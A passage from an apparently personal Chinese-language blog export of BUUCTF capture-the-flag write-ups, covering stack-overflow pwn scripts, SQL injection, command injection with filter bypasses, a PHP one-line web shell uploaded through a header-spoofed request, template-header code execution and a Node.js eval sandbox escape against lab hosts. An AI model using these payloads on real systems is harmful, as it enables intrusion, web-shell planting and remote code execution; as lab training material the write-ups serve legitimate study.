b'flag\\n'\n    b'flag.txt\\n'\n    b'home\\n'\n    b'lib\\n'\n    b'lib32\\n'\n    b'lib64\\n'\n    b'media\\n'\n    b'mnt\\n'\n    b'opt\\n'\n    b'proc\\n'\n    b'pwn\\n'\n    b'root\\n'\n    b'run\\n'\n    b'sbin\\n'\n    b'srv\\n'\n    b'sys\\n'\n    b'tmp\\n'\n    b'usr\\n'\n    b'var\\n'\nbin\nboot\ndev\netc\nflag\nflag.txt\nhome\nlib\nlib32\nlib64\nmedia\nmnt\nopt\nproc\npwn\nroot\nrun\nsbin\nsrv\nsys\ntmp\nusr\nvar\n$ cat flag\n[DEBUG] Sent 0x9 bytes:\n    b'cat flag\\n'\n[DEBUG] Received 0x2b bytes:\n    b'flag{1d66c11a-8e1b-4255-9e2a-09e4222bb119}\\n'\nflag{1d66c11a-8e1b-4255-9e2a-09e4222bb119}\n$ \n[*] Interrupted\n[*] Closed connection to node4.buuoj.cn port 25434\n```\nflag:~~flag{1d66c11a-8e1b-4255-9e2a-09e4222bb119}~~\n\n---\n好欸，多谢林靖学长，找到问题了，是数据发的太快了，容易错位，改进后就可以了：\n```python\nfrom pwn import *\n\nio = remote('node4.buuoj.cn',25434)\n\nbackdoor = 0x4006e6\n\npayload = 'a'.encode() * (0x10+8) + p64(backdoor)\n\nio.sendlineafter('of your name:','100')\nio.sendlineafter('name?',payload)\n\nio.interactive()\n```\n得到返回：\n```shell\nrandark@randark-VirtualBox:~/shared$ python Pwn.py\n[+] Opening connection to node4.buuoj.cn on port 25434: Done\nPwn.py:9: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n  io.sendlineafter('of your name:','100')\n/usr/local/lib/python3.8/dist-packages/pwnlib/tubes/tube.py:822: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n  res = self.recvuntil(delim, timeout=timeout)\n[*] Switching to interactive mode\n\n$ ls\nbin\nboot\ndev\netc\nflag\nflag.txt\nhome\nlib\nlib32\nlib64\nmedia\nmnt\nopt\nproc\npwn\nroot\nrun\nsbin\nsrv\nsys\ntmp\nusr\nvar\n$ cat flag\nflag{1d66c11a-8e1b-4255-9e2a-09e4222bb119}\n$ \n[*] Interrupted\n[*] Closed connection to node4.buuoj.cn port 25434\n```\n\n---\n参考：\n1.[bjdctf_2020_babystack](https://www.freesion.com/article/7762866583/)","categories":["Pwn","栈溢出"]},{"title":"ciscn_2019_n_1","url":"/2021/09/12/ciscn_2019_n_1/","content":"[题目链接](https://buuoj.cn/challenges#ciscn_2019_n_1)\n<!-- more -->\n先看一下保护信息：\n```shell\nrandark@randark-VirtualBox:~/shared$ checksec ciscn_2019_n_1\n[*] Checking for new versions of pwntools\n    To disable this functionality, set the contents of /home/randark/.cache/.pwntools-cache-3.8/update to 'never' (old way).\n    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):\n        [update]\n        interval=never\n[*] You have the latest version of Pwntools (4.6.0)\n[*] '/home/randark/shared/ciscn_2019_n_1'\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x400000)\n```\nIDA打开看一下逻辑：\n![](/images/Writeup/20210912164806.png)\n看起来是输入了v1，然后校验v2的数据，也就是要溢出数据到v2，看一下v1和v2\n```c\nchar v1[44]; // [rsp+0h] [rbp-30h] BYREF\nfloat v2; // [rsp+2Ch] [rbp-4h]\n```\n另外看一下v2的目标值的十六进制数据：\n![](/images/Writeup/20210912165127.png)\n```c\n.rodata:00000000004007B4 s               db 'Let',27h,'s guess the number.',0\n.rodata:00000000004007B4                                         ; DATA XREF: func+11↑o\n.rodata:00000000004007CC ; const char command[]\n.rodata:00000000004007CC command         db 'cat /flag',0        ; DATA XREF: func+48↑o\n.rodata:00000000004007D6 ; const char aItsValueShould[]\n.rodata:00000000004007D6 aItsValueShould db 'Its value should be 11.28125',0\n.rodata:00000000004007D6                                         ; DATA XREF: func:loc_4006CF↑o\n.rodata:00000000004007F3                 align 4\n.rodata:00000000004007F4 dword_4007F4    dd 41348000h            ; DATA XREF: func+31↑r\n.rodata:00000000004007F4                                         ; func+3F↑r\n.rodata:00000000004007F4 _rodata         ends\n```\n所以构造Playload：\n```python\nfrom pwn import *\n\np = remote('', )\npayload = 'a'*(0x30-0x04) + p32(0x41348000)\n\np.sendline(payload)\np.interactive()\n```\n得到flag：\n```shell\nrandark@randark-VirtualBox:~/shared$ python Pwn.py\n[+] Opening connection to node4.buuoj.cn on port 28257: Done\n[*] Switching to interactive mode\nLet's guess the number.\nflag{523f022b-c00a-489b-958e-35b48cdcecb4}\n[*] Got EOF while reading in interactive\n$ \n[*] Interrupted\n[*] Closed connection to node4.buuoj.cn port 28257\n```\nflag:~~flag{523f022b-c00a-489b-958e-35b48cdcecb4}~~\n\n\n\n\n\n---\n参考：\n1.[【BUUCTF - PWN】ciscn_2019_n_1](https://buuoj.cn/challenges#[MRCTF2020]CyberPunk)\n\n","categories":["Pwn","栈溢出"]},{"title":"极客大挑战 2019-PHP","url":"/2021/09/06/极客大挑战 2019-PHP/","content":"[题目链接](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]PHP)\n<!-- more -->\n我分配到的主机是：\n```text\n1d997fa1-d1d6-467e-9349-11a7c4364d98.node4.buuoj.cn:81\n```\n进入网页。没发现有什么特别的东西，根据网站提示，尝试获取www.zip文件：\n![](/images/Writeup/20210906091641.png)\n![](/images/Writeup/20210906091735.png)\n发现www.zip文件内含有flag.php文件：\n```php\n<?php\n$flag = 'Syc{dog_dog_dog_dog}';\n?>\n```\nflag:~~flag{dog_dog_dog_dog}~~\n\n\n","categories":["Web"]},{"title":"others_shellcode","url":"/2021/09/03/others_shellcode/","content":"[题目链接](https://buuoj.cn/challenges#others_shellcode)\n<!-- more -->\n这题有点奇怪，直接连接就能得到flag：\n```shell\nrandark@randark-VirtualBox:~/shared$ nc node4.buuoj.cn 25817\nls\nbin\nboot\ndev\netc\nflag\nflag.txt\nhome\nlib\nlib32\nlib64\nmedia\nmnt\nopt\nproc\npwn\nroot\nrun\nsbin\nsrv\nsys\ntmp\nusr\nvar\ncat flag\nflag{12806517-655a-4fb7-941e-04f1549da2e8}\n^C\n```\nflag:~~flag{12806517-655a-4fb7-941e-04f1549da2e8}~~\n\n\n","categories":["Pwn"]},{"title":"GXYCTF2019-BabySQli","url":"/2021/09/01/GXYCTF2019-BabySQli/","content":"[题目链接](https://buuoj.cn/challenges#[GXYCTF2019]BabySQli)\n<!-- more -->\n我分配到的主机是：\n```text\nhttp://f42e204a-6420-459d-a0b1-eeffe8b213a0.node4.buuoj.cn:81/\n```\n打开链接，看到这个页面：\n![](/images/Writeup/20210903210259.png)\n测试一下以下数据：\n```text\nadmin-admin\n```\n不出意外的，被拒绝了。。\n![](/images/Writeup/20210903210408.png)\n用[[Hackbar)看一下post的数据：\n![](/images/Writeup/20210903210525.png)\n ```text\nname=admin&pw=admin\n```\n尝试一下插入查询数据库语句:\n```text\nname=admin'show databases%23&pw=admin\n```\n```text\nError: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'show '' at line 1 \n```\n看来是不能用show语句,看看Order by查询:\n```text\nname=admin'Order by 4#&pw=admin\n```\n![](/images/Writeup/20210903213857.png)\n说明数据表应该只有3列，看看union select：\n```text\nname=admin'union select 1,2,3#&pw=admin\n```\n![](/images/Writeup/20210903214016.png)\n确实只有3列数据，看看三列数据分别为什么数据：\n```\nname=1'union select 1,2,3#&pw=admin //Wrong user!\nname=1'union select 1,'admin',3#&pw=admin //Wrong pass!\n```\n看出第一列应该是数据id，也就是1，而用户名“admin”应该位于第二列，那么第三列应该就是密码了，并且结合题干，应该密码是以MD5的形式储存的。那么尝试使用联合查询插入数据，这里以密码：“pp”为例：\n先计算“pp”的MD5的值：\n```text\nc483f6ce851c9ecd9fb835ff7551737c\n```\n然后构建playload：\n```text\nname=1'union select 1,'admin','c483f6ce851c9ecd9fb835ff7551737c'#&pw=pp\n```\n执行后，便可以在返回值里面看到flag。\nflag:~~flag{d3a5b24e-78de-4ef0-9bde-86d5c60056db}~~\n\n\n---\n参考：\n1.[[GXYCTF2019]BabySQli——“绕过md5比较”](https://blog.csdn.net/qq_45521281/article/details/107167452)\n2.[[GXYCTF2019]BabySQli](https://www.cnblogs.com/gaonuoqi/p/12355035.html)\n\n","categories":["Web","PHP代码审计","SQL注入"]},{"title":"BJDCTF2020-The mystery of ip","url":"/2021/09/01/BJDCTF2020-The mystery of ip/","content":"[题目链接](https://buuoj.cn/challenges#[BJDCTF2020]The%20mystery%20of%20ip)\n<!-- more -->\n我分配到的主机是：\n```text\nhttp://node4.buuoj.cn:26758\n```\n打开链接，发现是静态页面，没啥想法，翻翻看看：\n![](/images/Writeup/20210908111447.png)\n![](/images/Writeup/20210908111457.png)\n![](/images/Writeup/20210908111510.png)\n用[[Burp Suite)看一下：\n![](/images/Writeup/20210908111538.png)\n怀疑是请求头读取，尝试构造Request：\n```html\nGET /flag.php HTTP/1.1\nHost: node4.buuoj.cn:26758\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nReferer: http://node4.buuoj.cn:26758/hint.php\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nclient-ip:{75}\nConnection: close\n```\n发现读取到的ip确实显示成75了，尝试一下看看能不能执行指令：\n```html\nGET /flag.php HTTP/1.1\nHost: node4.buuoj.cn:26758\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nReferer: http://node4.buuoj.cn:26758/hint.php\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nclient-ip:{1+1}\nConnection: close\n```\n发现也确实可以，尝试读取目录信息：\n```html\nGET /flag.php HTTP/1.1\nHost: node4.buuoj.cn:26758\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nReferer: http://node4.buuoj.cn:26758/hint.php\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nclient-ip:{system('ls')}\nConnection: close\n```\n返回的信息：\n```text\nYour IP is : bootstrap\ncss\nflag.php\nheader.php\nhint.php\nimg\nindex.php\njquery\nlibs\ntemplates_c\ntemplates_c\t\t\n```\n构造Request，尝试读取flag：\n```html\nGET /flag.php HTTP/1.1\nHost: node4.buuoj.cn:26758\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nReferer: http://node4.buuoj.cn:26758/hint.php\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nclient-ip:{system('cat /flag')}\nConnection: close\n```\n得到返回值：\n```text\nYour IP is : flag{b2aa5179-9750-4a61-9499-30b8c66622a8}\nflag{b2aa5179-9750-4a61-9499-30b8c66622a8}\n```\nflag:~~flag{b2aa5179-9750-4a61-9499-30b8c66622a8}~~\n\n","categories":["Web","请求伪造"]},{"title":"GXYCTF2019-Ping Ping Ping","url":"/2021/09/01/GXYCTF2019-Ping Ping Ping/","content":"[题目链接](https://buuoj.cn/challenges#[GXYCTF2019]Ping%20Ping%20Ping)\n<!-- more -->\n我分配到的主机是：\n```text\nhttp://91427b93-b255-445e-8e96-e75b6234ba1f.node4.buuoj.cn:81/\n```\n这个跟[[ACTF2020 新生赛-Exec)这道题很想，都是基于额外命令的执行，尝试构建playload：\n```text\n/?ip=1;ls;\n```\n得到返回：\n```text\n/?ip=\n\nPING 1 (0.0.0.1): 56 data bytes\nflag.php\nindex.php\n```\n看来flag就在flag.php里面，尝试读取：\n```text\n/?ip=1;cat flag.php;\n```\n但是根据返回，看来是存在关键词黑名单：\n```text\n/?ip= fxck your space!\n```\n尝试使用多命令堆叠执行：\n```text\n/?ip=1;u=a;c$ut fl$g.php;\n```\n结果还是一样的返回，看来是还存在空格排除，接着构造playload：\n```text\n/?ip=127.0.0.1;e=g;cat$IFS$1fla$e.php\n```\n执行后，看网页源码，就得到了flag：\n![](/images/Writeup/20210830152906.png)\nflag:~~flag{5b5de8a8-c38d-443d-a242-101255c7ca3c}~~\n\n\n","categories":["Web","RCE"]},{"title":"GYCTF2020-Blacklist","url":"/2021/09/01/GYCTF2020-Blacklist/","content":"[题目链接](https://buuoj.cn/challenges#[GYCTF2020]Blacklist)\n<!-- more -->\n我分配到的主机是：\n```text\nhttp://6ccfac7a-f644-41bf-a0d8-174b5ad4e554.node4.buuoj.cn:81\n```\n前面都尝试过了，思路跟<kbd>强网杯 2019-随便注</kbd>差不多，但是明显关键词黑名单变多了：\n```php\nreturn preg_match(\"/set|prepare|alter|rename|select|update|delete|drop|insert|where|\\./i\",$inject);\n```\n于是，结合搜索引擎查找，找到了可用的playload：\n```php\n1';handler FlagHere open;handler FlagHere read first;handler FlagHere close;#\n```\nflag:~~flag{94fa6652-22ea-4375-8c5b-103d324321fa}~~\n\n","categories":["Web","SQL注入"]},{"title":"极客大挑战 2019-BuyFlag","url":"/2021/09/01/极客大挑战 2019-BuyFlag/","content":"[题目链接](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]BuyFlag)\n<!-- more -->\n我分配到的主机是：\n```text\nhttp://1fa030e9-97a3-4843-a636-03a91a5e7b42.node4.buuoj.cn:81/\n```\n打开来就是一个普通的主页，源码也没有信息，侧边菜单栏看一下：\n![](/images/Writeup/20210901085209.png)\n跳转到pay.php，看一下页面提示：\n![](/images/Writeup/20210901085236.png)\n看了一下网页源码，发现一段hint：\n\n```php\n\t~~~post money and password~~~\nif (isset($_POST['password'])) {\n\t$password = $_POST['password'];\n\tif (is_numeric($password)) {\n\t\techo \"password can't be number</br>\";\n\t}elseif ($password == 404) {\n\t\techo \"Password Right!</br>\";\n\t}\n}\n```\n那么看来是post过去password和money来获取cookie。先看一下password：首先先校验了password是否为数字，是的话返回报错，不是数字的话则比较password是否为404，那么考虑使用%20作为特殊字符通过校验。\n![](/images/Writeup/20210901085807.png)\n但是提示说身份不对，尝试寻找cookie：\n![](/images/Writeup/20210901085838.png)\n将user的值改为1，通过身份校验：\n![](/images/Writeup/20210901085909.png)\n然后POST数据里面加上money=100000000，结果返回数据过长：\n![](/images/Writeup/20210901085957.png)\n看到这，自然想尝试一下科学计数法：\n![](/images/Writeup/20210901090033.png)\n得到了flag。\n当然，根据漏洞，也可以构造：money\\[\\]=1来通过：\n![](/images/Writeup/20210901090138.png)\nflag:~~flag{16d85973-715c-44cf-8f95-caf99c5512cb}~~\n\n\n\n\n---\n参考：\n1.[[极客大挑战 2019]BuyFlag](https://www.cnblogs.com/zzjdbk/p/13641490.html)\n2.[[极客大挑战 2019]BuyFlag](https://blog.csdn.net/weixin_44348894/article/details/105333137)\n2021-09-01\n","categories":["Web","PHP代码审计"]},{"title":"极客大挑战 2019-Knife","url":"/2021/09/01/极客大挑战 2019-Knife/","content":"[题目链接]()\n<!-- more -->\n我分配到的主机是：\n```text\nhttp://49aaecc9-25d0-4ac0-a90e-2231c7f8f839.node4.buuoj.cn:81/\n```\n打开链接，提示靶机已经挂上马：\n![](/images/Writeup/20210830153047.png)\n用[[蚁剑)连接一下试试：\n![](/images/Writeup/20210830153216.png)\n可以连接，并且发现flag：\n![](/images/Writeup/20210830153303.png)\nflag:~~flag{eef8c4da-9a18-48ec-84c2-9f5451bf9ada}~~\n","categories":["Web","文件上传"]},{"title":"极客大挑战 2019-Upload","url":"/2021/09/01/极客大挑战 2019-Upload/","content":"[题目链接](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Upload)\n<!-- more -->\n我分配到的主机是：\n```text\nhttp://3b287f28-6607-420b-95bc-dcba771a0561.node4.buuoj.cn:81\n```\n打开链接，这肯定是上传类问题了：\n![](/images/Writeup/20210901162930.png)\n构建一句话挂马：\n```php\nGIF89a\n<script language='php'>@eval($_POST['pp']);</script>\n```\n改后缀为phtml，开[[Burp Suite)抓包以下，顺便改一下包（校验文件格式是依赖header的）：\n![](/images/Writeup/20210901163123.png)\n![](/images/Writeup/20210901163139.png)\nhearer改为以下数据后再放行：\n```php\nPOST /upload_file.php HTTP/1.1\nHost: 3b287f28-6607-420b-95bc-dcba771a0561.node4.buuoj.cn:81\nContent-Length: 357\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: http://3b287f28-6607-420b-95bc-dcba771a0561.node4.buuoj.cn:81\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryy2mzzN1AcBhRr0lk\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nReferer: http://3b287f28-6607-420b-95bc-dcba771a0561.node4.buuoj.cn:81/\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\n\n------WebKitFormBoundaryy2mzzN1AcBhRr0lk\nContent-Disposition: form-data; name=\"file\"; filename=\"test.phtml\"\nContent-Type: image/jpeg\n\nGIF89a\n<script language='php'>@eval($_POST['pp']);</script>\n------WebKitFormBoundaryy2mzzN1AcBhRr0lk\nContent-Disposition: form-data; name=\"submit\"\n\n鎻愪氦\n------WebKitFormBoundaryy2mzzN1AcBhRr0lk--\n```\n成功绕过格式校验。然后使用[[蚁剑)连接脚本：\n![](/images/Writeup/20210901163328.png)\n在网页根目录下发现flag：\n![](/images/Writeup/20210901163403.png)\nflag:~~flag{821893be-7366-4df1-8f29-df09e7918b58}~~\n","categories":["Web","文件上传"]},{"title":"NPUCTF2020-验证🐎","url":"/2021/08/31/NPUCTF2020-验证🐎/","content":"[题目链接](https://buuoj.cn/challenges#[NPUCTF2020]%E9%AA%8C%E8%AF%81%F0%9F%90%8E)\n<!-- more -->\n我分配到的主机是：\n```text\nhttp://a32c061e-032b-4338-9466-7c9b789fb397.node4.buuoj.cn:81/\n```\n看样子，里面应该是一套验证算法：\n![](/images/Writeup/20210831065040.png)\nF12看了一下源码，没发现切入口，但是点击最上面的按钮会出来判断结构的代码：\n![](/images/Writeup/20210831065142.png)\n```php\nconst express = require('express');\nconst bodyParser = require('body-parser');\nconst cookieSession = require('cookie-session');\n\nconst fs = require('fs');\nconst crypto = require('crypto');\n\nconst keys = require('./key.js').keys;\n\nfunction md5(s) {\n  return crypto.createHash('md5')\n    .update(s)\n    .digest('hex');\n}\n\nfunction saferEval(str) {\n  if (str.replace(/(?:Math(?:\\.\\w+)?)|[()+\\-*/&|^%<>=,?:]|(?:\\d+\\.?\\d*(?:e\\d+)?)| /g, '')) {\n    return null;\n  }\n  return eval(str);\n} // 2020.4/WORKER1 淦，上次的库太垃圾，我自己写了一个\n\nconst template = fs.readFileSync('./index.html').toString();\nfunction render(results) {\n  return template.replace('{{results}}', results.join('<br/>'));\n}\n\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: false }));\napp.use(bodyParser.json());\n\napp.use(cookieSession({\n  name: 'PHPSESSION', // 2020.3/WORKER2 嘿嘿，给👴爪⑧\n  keys\n}));\n\nObject.freeze(Object);\nObject.freeze(Math);\n\napp.post('/', function (req, res) {\n  let result = '';\n  const results = req.session.results || [];\n  const { e, first, second } = req.body;\n  if (first && second && first.length === second.length && first!==second && md5(first+keys[0]) === md5(second+keys[0])) {\n    if (req.body.e) {\n      try {\n        result = saferEval(req.body.e) || 'Wrong Wrong Wrong!!!';\n      } catch (e) {\n        console.log(e);\n        result = 'Wrong Wrong Wrong!!!';\n      }\n      results.unshift(`${req.body.e}=${result}`);\n    }\n  } else {\n    results.unshift('Not verified!');\n  }\n  if (results.length > 13) {\n    results.pop();\n  }\n  req.session.results = results;\n  res.send(render(req.session.results));\n});\n\n// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI\napp.get('/source', function (req, res) {\n  res.set('Content-Type', 'text/javascript;charset=utf-8');\n  res.send(fs.readFileSync('./index.js'));\n});\n\napp.get('/', function (req, res) {\n  res.set('Content-Type', 'text/html;charset=utf-8');\n  req.session.admin = req.session.admin || 0;\n  res.send(render(req.session.results = req.session.results || []))\n});\n\napp.listen(80, '0.0.0.0', () => {\n  console.log('Start listening')\n});\n```\n其实就是代码审计的题，但是仍然看不懂。。\n总之，构建脚本：\n```python\nimport requests\nimport json\nheaders = {\n    \"Content-Type\":\"application/json\"\n}\nurl = \"http://14b5ae3b-e444-4e5b-9e2b-1ba3100fc085.node3.buuoj.cn/\"\ndata = {\"e\":'(Math=>(Math=Math.constructor,Math.x=Math.constructor(Math.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41))()))(Math+1)',\"first\":[0],\"second\":\"0\"}\nr = requests.post(url,data=json.dumps(data),headers=headers)\nprint(r.text)\n```\nflag:~~flag{745e5b8f-0f2a-43a7-a101-0a89e58d94ac}~~\n\n\n\n\n---\n参考：\n1.[[NPUCTF2020]验证码](https://blog.csdn.net/rfrder/article/details/115406785)\n2.[NPUCTF2020 验证🐎-（弱类型比较、hash绕过、构造函数执行任意代码）](https://www.plasf.cn/articles/d5efc80b37.html)\n","categories":["Web","PHP代码审计"]},{"title":"ACTF2020 新生赛-Exec","url":"/2021/08/30/ACTF2020 新生赛-Exec/","content":"[题目链接](https://buuoj.cn/challenges#[ACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B]Exec)\n<!-- more -->\n我分配到的主机是：\n```text\nhttp://c3c90b43-0f44-43b6-88d1-e18fc3307132.node4.buuoj.cn:81/\n```\n打开来，是一个ping的网页：\n![](/images/Writeup/20210830150841.png)\n看起来不像是数据库类型，怀疑是Linux指令执行，用；或者|来执行多个指令：\n```text\n1;ls /;\n1|ls /;\n```\n得到目录下的文件信息：\n```text\nbin\ndev\netc\nflag\nhome\nlib\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nsrv\nsys\ntmp\nusr\nvar\n```\n然后构建playload读取flag：\n```text\n1;cat /flag;\n```\nflag:~~flag{56130bee-181c-43c0-abb8-f9639eec35fb}~~\n","categories":["Web","RCE"]},{"title":"ACTF2020 新生赛-BackupFile","url":"/2021/08/30/ACTF2020 新生赛-BackupFile/","content":"[题目链接](https://buuoj.cn/challenges#[ACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B]BackupFile)\n<!-- more -->\n我分配到的主机是：\n```text\nhttp://c25ca069-842d-4e3f-ba55-e0e81096dbec.node4.buuoj.cn:81/\n```\n打开来，没啥重要的信息，源码也没东西：\n![](/images/Writeup/20210830193517.png)\n根据题目，尝试获取index.php的备份文件。成功了：\n![](/images/Writeup/20210830193548.png)\n获取到了一份php代码：\n```php\n<?php\ninclude_once \"flag.php\";\n\nif(isset($_GET['key'])) {\n    $key = $_GET['key'];\n    if(!is_numeric($key)) {\n        exit(\"Just num!\");\n    }\n    $key = intval($key);\n    $str = \"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3\";\n    if($key == $str) {\n        echo $flag;\n    }\n}\nelse {\n    echo \"Try to find out source file!\";\n}\n```\n那么无脑先尝试一下：\n```url\nhttp://c25ca069-842d-4e3f-ba55-e0e81096dbec.node4.buuoj.cn:81/?key=123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3\n```\n返回了”Just num!“，结合上面的代码，应该是只要前面的数字部分：\n```url\nhttp://c25ca069-842d-4e3f-ba55-e0e81096dbec.node4.buuoj.cn:81/?key=123\n```\n![](/images/Writeup/20210830194010.png)\nflag:~~flag{4678282c-fd05-408c-917f-6885b938a490} ~~\n\n\n","categories":["Web","PHP代码审计"]},{"title":"ACTF2020 新生赛-Include","url":"/2021/08/30/ACTF2020 新生赛-Include/","content":"[题目链接](https://buuoj.cn/challenges#[ACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B]Include)\n<!-- more -->\n我分配到的主机是：\n```text\nhttp://9cf680dc-54b5-4807-aa54-dfc0273f65db.node4.buuoj.cn:81\n```\n打开，发现就一个tips：\n![](/images/Writeup/20210830072303.png)\n![](/images/Writeup/20210830072315.png)\n>考察利用php://filter伪协议进行文件包含\n构造payload = http://5165ec02-c72d-4737-85c5-295e639ea759.node3.buuoj.cn/?file=php://filter/read=convert.base64-encode/resource=flag.php\n————————————————\n版权声明：本文为CSDN博主「黑仔丶」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。\n原文链接：https://blog.csdn.net/qq_42404383/article/details/107946738\n访问，得到一串密文：\n![](/images/Writeup/20210830072453.png)\nbase64解码，得到：\n```php\n<?php\necho \"Can you find out the flag?\";\n//flag{7054babe-8911-4f25-85a9-32d5e4023b85}\n```\nflag:~~flag{7054babe-8911-4f25-85a9-32d5e4023b85}~~\n其实思路就是flag写在了源文件的注释里面，然后需要读取源文件的内容，而不是读取经过编码后的内容（编码时注释不会加载进去）\n\n\n","categories":["Web","PHP代码审计"]},{"title":"HCTF 2018-WarmUp","url":"/2021/08/30/HCTF 2018-WarmUp/","content":"[题目链接](https://buuoj.cn/challenges#[HCTF%202018]WarmUp)\n<!-- more -->\n我分配到的主机是：\n```text\nhttp://9d7694b9-33a5-44e2-ab9e-f0aebb30f00d.node4.buuoj.cn:81/\n```\n访问，可以发现是一张滑稽：\n![](/images/Writeup/20210830070115.png)\n可以发现源码中出现其他网页：\n![](/images/Writeup/20210830070224.png)\n访问source.php，得到一份php代码：\n```php\n<?php\n    highlight_file(__FILE__);\n    class emmm\n    {\n        public static function checkFile(&$page)\n        {\n            $whitelist = [\"source\"=>\"source.php\",\"hint\"=>\"hint.php\"];\n            if (! isset($page) || !is_string($page)) {\n                echo \"you can't see it\";\n                return false;\n            }\n\n            if (in_array($page, $whitelist)) {\n                return true;\n            }\n\n            $_page = mb_substr(\n                $page,\n                0,\n                mb_strpos($page . '?', '?')\n            );\n            if (in_array($_page, $whitelist)) {\n                return true;\n            }\n\n            $_page = urldecode($page);\n            $_page = mb_substr(\n                $_page,\n                0,\n                mb_strpos($_page . '?', '?')\n            );\n            if (in_array($_page, $whitelist)) {\n                return true;\n            }\n            echo \"you can't see it\";\n            return false;\n        }\n    }\n\n    if (! empty($_REQUEST['file'])\n        && is_string($_REQUEST['file'])\n        && emmm::checkFile($_REQUEST['file'])\n    ) {\n        include $_REQUEST['file'];\n        exit;\n    } else {\n        echo \"<br><img src=\\\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\" />\";\n    }  \n?>\n```\n其中，PHP逻辑运算符：&&表明逻辑-->与，||表明逻辑-->或\n```php\n!empty($_REQUEST['file']) # 要我们的file变量不为空我们先进行分析这段代码 首先看80行第一个要求\n\nis_string($_REQUEST['file']) # 要求我们传进来的值是字符串类型\n\nemmm::checkFile($_REQUEST['file']) # 这里将我们的的值传到emmm类里面的checkFile函数\n```\n这三个值通过&&逻辑运算符连接，也就是要求这块函数的返回值要全为真，才能执行if里面的文件包含的代码，否则就执行else里面的图片代码。\n其中源码中还涉及到hint.php这个文件，访问一下看一下：\n![](/images/Writeup/20210830070816.png)\n看来目标就是利用source.php里面体现出来的文件读取的漏洞。\n总的来说这个cehckFile这个函数进行了 3次白名单检测、 2次问号过滤、一次URL解码：\n```php\nclass emmm\n    {\n        public static function checkFile(&$page)\n\n        {\n            //白名单列表\n            $whitelist = [\"source\"=>\"source.php\",\"hint\"=>\"hint.php\"];\n            //isset()判断变量是否声明is_string()判断变量是否是字符串 &&用了逻辑与两个值都为真才执行if里面的值\n            if (! isset($page) || !is_string($page)) {\n                echo \"you can't see it A\";\n                return false;\n            }\n            //检测传进来的值是否匹配白名单列表$whitelist 如果有则执行真\n            if (in_array($page, $whitelist)) {\n                return true;\n            }\n            //过滤问号的函数(如果$page的值有？则从?之前提取字符串)\n            $_page = mb_substr(\n                $page,\n                0,\n                mb_strpos($page . '?', '?')//返回$page.?里卖弄?号出现的第一个位置\n            );\n\n             //第二次检测传进来的值是否匹配白名单列表$whitelist 如果有则执行真\n            if (in_array($_page, $whitelist)) {\n                return true;\n            }\n            //url对$page解码\n            $_page = urldecode($page);\n\n            //第二次过滤问号的函数(如果$page的值有？则从?之前提取字符串)\n            $_page = mb_substr(\n                $_page,\n                0,\n                